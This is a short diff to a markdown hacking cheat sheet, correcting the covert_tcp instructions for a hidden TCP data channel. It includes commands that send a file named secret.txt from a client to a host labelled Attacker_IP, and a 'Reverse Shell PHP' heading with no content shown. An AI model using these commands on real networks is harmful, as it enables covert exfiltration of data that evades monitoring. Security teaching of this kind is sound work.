@@ -308,13 +308,13 @@ covert_tcp - to create secret channel
 cc -o covert_tcp covert_tcp.c
   ```
   * Sender Machine(Client_IP)
+  * * Create A Message file that need to be transferred Eg: secret.txt
   ```console
-  sudo ./covert_tcp -source Client_IP -dest Attacker_IP -source_port 9999 -dest_port 8888 -file recieve.txt
+  sudo ./covert_tcp -source Client_IP -dest Attacker_IP -source_port 9999 -dest_port 8888 -file secret.txt
   ```
   * Reciever Machine( Attacker_IP)
-  * Create A Message file that need to be transferred Eg: secret.txt
   ```console
-  sudo ./covert_tcp -source Client_IP -source_port 8888 -server -file secret.txt
+  sudo ./covert_tcp -source Client_IP -source_port 8888 -server -file recieved.txt
   ```
 ## Reverse Shell PHP
   
